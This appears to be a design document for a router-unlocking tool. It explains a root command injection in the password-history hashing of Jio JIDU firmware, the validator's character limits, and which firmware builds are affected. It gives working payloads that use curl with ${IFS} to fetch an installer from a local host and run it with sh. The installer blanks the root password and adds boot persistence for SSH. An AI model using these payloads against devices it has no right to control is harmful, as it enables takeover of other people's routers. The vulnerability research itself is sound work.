# How the unlock works

`idu-unlock` gives you root over the router's own web API. It does not write
firmware, and it installs nothing beyond what keeping SSH alive requires.

## The vulnerable call

The password reaches a shell through the **password-history hash**, not through
the `passwd` call. Read from a stock `JIDU6801` rootfs on `R2.0.19.6`.

`usr/lib/lua/luci/model/jio/rules/user.lua` validates a new password and then
hashes it to check it against the last three:

```lua
local command = string.format(CONSTANTS.CMD_OPENSSL_HASH_PASSWORD, newPasswd, rsn)
local hashPassword = jioUtil.remove_newline(luci.sys.exec(command))
```

`usr/lib/lua/luci/model/jio/constants.lua:215` builds that command with the
password inside **double** quotes:

```lua
CMD_OPENSSL_HASH_PASSWORD = 'echo -n "%s" | openssl dgst -sha256 -mac HMAC -macopt key:%s | cut -d " " -f 2'
```

`luci.sys.exec` runs it through `/bin/sh`, so `$(...)` in the password is
evaluated as root before `openssl` sees it. `savePasswdHistory` uses the same
command again when it records the new hash.

The `setPassword` function on the same build is a red herring:

```lua
function setPassword(username, password)
	local resp = os.execute(
		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
		.. "passwd '" .. username .. "' >/dev/null 2>&1")

	if tonumber(resp) == tonumber(0) then
		savePasswdHistory(username, password)
	end
	return resp
end
```

Its password is inside **single** quotes, where `$(...)` is literal. The
injection happens earlier, in `checkPasswordHistory`, before `setPassword` is
reached.

## Why "accepted" is not "executed"

A stock `JIDU6801` rootfs on `R2.0.18.2` has neither `checkPasswordHistory` nor
`savePasswdHistory`. Its `change_user_password` calls `setPassword`, which pipes
the single-quoted password to `passwd`, and `passwd` happily sets that literal
string as the guest password. The API replies `OK`.

So a payload such as `Aa1$(curl${IFS}192.168.31.51>/a)` is **accepted**, and no
callback ever arrives, because no shell evaluated the `$(...)`. That is the
failure behind "payload accepted, no callback": this handler is not injectable,
and no firewall change or retry will help. `unlock` now probes for this before it
sends a payload.

## The validator's real rules

Read from the same rootfs (`rules/common/vlib.lua`, `rules/user.lua`):

| Rule | Source | Consequence |
| --- | --- | --- |
| 8–32 characters | `isStringValidLength(password, 8, 32)` | almost no room |
| rejects `` ` `` `"` `'` `\|` `;` and whitespace | `hasValidChars1`, `^[^`\"'\|;%s]*$` | the obvious `curl … \| sh` is impossible |
| allows `$ ( ) { }` | no rule against them | command substitution works |
| `${IFS}` allowed | it is not whitespace | arguments without spaces |

That last row is not a curiosity — it is the only way to pass an argument at all,
because a literal space is rejected.

## Two steps, both inside the budget

Because `curl … | sh` is impossible, the installer is delivered in two payloads,
each of which fits the 32-character field:

```sh
Aa1$(curl${IFS}192.168.31.51>/a)   # 32 chars — fetch the installer
Aa1$(sh${IFS}/a)                   # 16 chars — run it
```

`/a` is the shortest absolute path writable as root, which caps the download
address at 13 characters (`192.168.31.51` fits exactly). `Injector` enforces all
of this and explains itself when a payload does not fit.

The prefix (`Aa1`) is randomised per run: the router remembers the last three
passwords per account, and a download payload always evaluates to its literal
prefix. The history probe carries a fresh prefix too, so it cannot collide with
the payloads that follow it.

The address is whatever local interface can reach the router —
`address_reaching()` works it out, and `--address` overrides it. The router
fetches the script from your machine, so your machine must be reachable from the
router on that address. That is the one place a firewall can get in the way; see
[TROUBLESHOOTING.md](TROUBLESHOOTING.md).

## The installer

The downloaded script runs as root and does three things:

1. `passwd -d root`, so sshd accepts an empty password
2. optionally installs the public key you passed with `--key`, into both
   `/root/.ssh/authorized_keys` and `/etc/dropbear/authorized_keys`
3. writes `/etc/init.d/idu-ssh` (`START=99`) and symlinks it as
   `S99idu-ssh` / `K01idu-ssh`, then starts dropbear

No keypair is ever generated, and with no `--key` nothing of ours is installed on
the router at all.

## Why persistence needs its own init script

The vendor's `/etc/init.d/dropbear` force-disables SSH on every boot of a Release
build, and this firmware has no `/etc/init.d/rc.local` — so the usual advice to
"add dropbear to `/etc/rc.local` before `exit 0`" does nothing here. Staying in
requires a script of our own, ordered after theirs.

That is `/etc/init.d/idu-ssh`:

```sh
#!/bin/sh /etc/rc.common
START=99
STOP=01
start() { dropbear -R -p 0.0.0.0:22; }
stop()  { killall dropbear; }
reload() { start; }
```

`START=99` runs it after the vendor's `S50dropbear`. `dropbear -R` regenerates the
host keys on every start, which is why SSH reports a changed host key after a
boot or a re-unlock — see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).

If you do use a key, make it RSA: dropbear v2020.81 on these units rejects
ed25519.

## The session dance

The backend is fussy and permits only one admin session at a time:
`preLogin` → `login` → `postLogin`, after which every call needs both
`Authorization: Bearer <bearer>` *and* the `sysauth` cookie the login reply hands
back. The reply's token is `<bearer>-<session>` — the first half goes in the
header, the second in the cookie — and the cookie is set with
`path=https://<host>`, which is not a legal cookie path, so `requests` discards
it unless it is re-stored against `/`. Without that, every call after login
answers `ERR_UNAUTHORIZED_OR_EXPIRED`, which reads like a hardened API rather
than a cookie the client threw away.

`Api.session()` is a context manager that does all of it and releases the session
on the way out. Releasing is courtesy, not a requirement: a session someone else
left sitting is answered with `ERR_LOGIN_DUPLICATE_ADMIN`, and rather than wait
we take it over the way the vendor's own web UI does — `postLogin` naming that
session's `loggedId`. On a `6j11` the sitting slot never expires, so waiting
cannot work and logging out of the web UI does not clear it either.

The target is the **guest** account (`userType=2`); that value keeps the handler
off its admin-session-kill branch.

## Firmware compatibility

This tool has exactly one method, `changeUserPassword`, so everything here is
about that handler. The version string is a hint, not a verdict. `check` reads it
together with the router's family and reports one of three states:

| Family | Build | `check` | Why |
| --- | --- | :---: | --- |
| MTK (`6j01`) | `R2.0.18.x` and older | `NO` | no password-history functions; an 18.2 rootfs was read |
| MTK (`6j01`) | `R2.0.19.0`–`R2.0.19.5` | `TEST` | the history feature landed somewhere in this window |
| MTK (`6j01`) | `R2.0.19.6`–`R3.2.0` | `YES` | the 19.6 rootfs has the double-quoted hash; 3.2.0 confirmed in the field |
| MTK (`6j01`) | `R3.2.1`–`R3.2.2` | `TEST` | the fix is somewhere between 3.2.0 and 3.2.3 |
| MTK (`6j01`) | `R3.2.3` and newer | `NO` | `luci.sys.user.setpasswd` replaced the shell-out |
| Qualcomm (`6j11`) | `R3.2.6` and earlier | `YES` | member-confirmed at 3.2.6; older builds may predate history, so the probe decides |
| Qualcomm (`6j11`) | `R3.2.7` and newer | `TEST` | no datapoint beyond 3.2.6 |

The lower bound is not cosmetic. The `R2.0.18.2` rootfs has no
`checkPasswordHistory` and no `savePasswdHistory`, so its `change_user_password`
never runs a shell with the password. The feature appears by `R2.0.19.6`, whose
rootfs carries both functions and the double-quoted hash shown above. No image
between `R2.0.19.0` and `R2.0.19.5` has been read, which is why that window is
`TEST` rather than `YES`.

On the upper end, the handler is **fixed by `R3.2.3`**. Read from a stock
`JIDU6701` rootfs on `R3.2.3` (`usr/lib/lua/luci/model/jio/session.lua`):

```lua
function setPassword(username, password)
	--[[ local resp = os.execute(
		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
		.. "passwd '" .. username .. "' >/dev/null 2>&1"
	) ]]

	-- use in build luci.sys.user util to avoid any shell injection not taken care at application level
	local resp = luci.sys.user.setpasswd(username, password)
```

The vendor's own comment names the bug — *"shell injection not taken care at
application level"* — and `luci.sys.user.setpasswd` passes the password as an
argument instead of through a shell. Which release between `R3.2.1` and `R3.2.3`
carries the fix has not been determined, so those two report `TEST`.

The families ship separate firmware branches, and the fix has not reached the
Qualcomm branch: a community member confirmed the injection on a `6j11` unit
running `R3.2.6`. Nothing newer has been reported, so `R3.2.7` and above remain
`TEST`.

### The runtime probe

`check` is read-only, and a version string cannot prove what the Lua actually
does. Before sending a payload, `unlock` changes the **guest** account's password
once to a random literal and re-reads the guest record:

- a new `passwdHistory` entry means `savePasswdHistory` ran, so this build has
  the vulnerable hash shell-out;
- no entry means the history write is absent. On the builds examined, the
  vulnerable shell-out is absent too: `unlock` raises `UnsupportedFirmware` and
  sends no payload. The guest password has changed to a random value, but the
  admin account and everything else are untouched.

`--force` turns that stop into a warning, for a build where the history
functions might be split across releases. The probe still runs, and the
callback is still the only evidence that a payload executed.

### What "NO" means in practice

On a locked unit running `NO` firmware, the `changeUserPassword` route is closed.
`detect` still works because it only reads the API. `backup` needs root SSH; it
works if SSH was already enabled (for example through UART), because `unlock`
checks for that before applying the firmware gate. Otherwise there is no
supported software-only backup before unlock, and the UART/u-boot console is the
fallback. Do not flash anything until you have a backup made through that route.

`NO` is a statement about this handler, not an audit of the whole firmware.
Other API handlers exist and are not tested or used here.

## Where the factory secrets live

Relevant because a backup collects them:

- U-boot console credentials are **not** in the u-boot environment. They are
  stored as plain `KEY=VALUE` text in the **MFG partition (`/dev/mtd7`)**, alongside
  the Wi-Fi PSK and web password.
- The partition named `u-boot-env` (`mtd2`) is **empty**. The real environment is
  in the UBI volume **`/dev/ubi0_0`** (inside mtd5), per `/etc/fw_env.config`. A
  second vendor-specific environment is in **mtd8**.

## Provenance

Clean-room implementation: the protocol flow is the device's own public API, and
the code shares nothing substantive with any existing proof of concept (the only
overlaps are standard Python/HTTP idioms such as the `application/json` header).

The OpenWrt procedure is documented separately in [OPENWRT.md](../OPENWRT.md).
Its reported community provenance is Cyborg → GeekyTwins server → WikiForce
Discord → Sandip → DIY Daddy's public documentation. This chain is based on
community accounts and has not been independently verified end to end; DIY
Daddy is credited as a publisher/reference, not as the originator. The separate
6j11 SSH method is credited to its published source there.
